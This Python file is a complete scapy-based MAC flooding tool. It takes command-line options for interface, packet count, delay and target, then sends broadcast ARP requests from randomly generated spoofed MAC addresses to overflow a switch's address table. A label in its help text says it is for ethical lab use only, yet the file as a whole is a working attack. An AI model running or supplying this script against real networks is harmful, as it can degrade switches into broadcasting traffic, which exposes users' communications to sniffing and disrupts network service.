#!/usr/bin/env python3

from scapy.all import Ether, ARP, sendp
import random
import time
import argparse

def generate_random_mac():
    """Generate a random MAC address."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xff) for _ in range(5))

def flood_mac_table(interface, target_ip=None, count=1000, delay=0.01):
    print(f"[+] Starting MAC flooding on interface: {interface}")
    print(f"[+] Sending {count} fake packets with random MAC addresses...\n")

    for i in range(count):
        # Generate random MAC and ARP packet
        fake_mac = generate_random_mac()
        ether = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")  # Broadcast
        arp = ARP(op=1, hwsrc=fake_mac, psrc="0.0.0.0", pdst=target_ip if target_ip else "192.168.1.1")
        packet = ether / arp

        sendp(packet, iface=interface, verbose=False)
        print(f"[+] Sent fake MAC: {fake_mac}")
        time.sleep(delay)

    print("\n[+] MAC flooding complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAC Flooding Attack Script (For Ethical Lab Use ONLY)")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Number of packets to send (default: 1000)")
    parser.add_argument("-d", "--delay", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")
    parser.add_argument("-t", "--target", help="Target IP (optional)")

    args = parser.parse_args()
    flood_mac_table(interface=args.interface, target_ip=args.target, count=args.count, delay=args.delay)
